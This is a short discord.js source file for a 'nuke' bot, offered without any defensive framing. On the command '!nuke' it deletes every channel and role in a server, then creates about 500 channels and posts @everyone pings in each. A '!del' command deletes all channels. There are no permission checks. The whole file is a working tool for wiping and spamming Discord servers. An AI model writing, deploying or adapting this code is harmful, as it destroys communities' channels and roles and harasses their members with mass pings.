const Discord = require('discord.js');
const client = new Discord.Client();


client.on("ready", () => {

    console.log("ready");

});

client.on("message", async (msg) => {

    /*Nuke command*/

    if(msg.content === ("!nuke")) {

        if(msg.guild.channels.cache) {

            msg.guild.channels.cache.forEach(channel => channel.delete());

        }

        if(msg.guild.roles.cache) {

            msg.guild.roles.cache.forEach(role => role.delete());

        }

        for($i = 0; $i <= 500; $i++) {

            await msg.guild.channels.create(`nuke-message`, {
                type : 'text'
            }).then(async channel=> {
                channel.send('@everyone');
            });

        }

    }

    /*Exit !nuke command*/ 

    if(msg.content === ("!break")) {
        process.exit();
    }

    /*Delete command for deleting all channels*/

    if(msg.content === ("!del")) {

        if(msg.guild.channels.cache) {

            msg.guild.channels.cache.forEach(channel => channel.delete());

        }

    }

});


client.login("your-token-goes-here");